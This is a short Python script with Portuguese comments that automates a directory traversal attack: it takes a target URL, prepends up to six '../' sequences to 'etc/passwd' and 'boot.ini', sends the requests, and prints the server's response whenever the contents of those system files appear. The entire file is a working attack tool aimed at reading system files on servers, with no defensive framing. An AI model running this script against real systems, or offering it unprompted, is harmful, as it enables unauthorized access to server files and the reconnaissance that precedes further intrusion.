#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# DirectoryTraversal.py3

"""
  Esse arquivo faz 
  tentaiva de ataque ao
  Referência de objeto direto
"""

# Importando as bibliotecas necessárias.
import requests
import sys

url = sys.argv[1] # Argumento 1
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'} # root para linux e boot.ini para Windows Server

up = "../"
i = 0

# Interação 
for payload, string in payloads.items():
	while i < 7:
		req = requests.post(url+(i*up)+payload)
		if string in req.text:
			print("Parâmetro vulnerável\r\n")
			print("Atacando com a string: "+(i*up)+payload+"\r\n")
			print(req.text)
			break
		else:
			print("Não é vulnerável")
		i = i+1
	i = 0





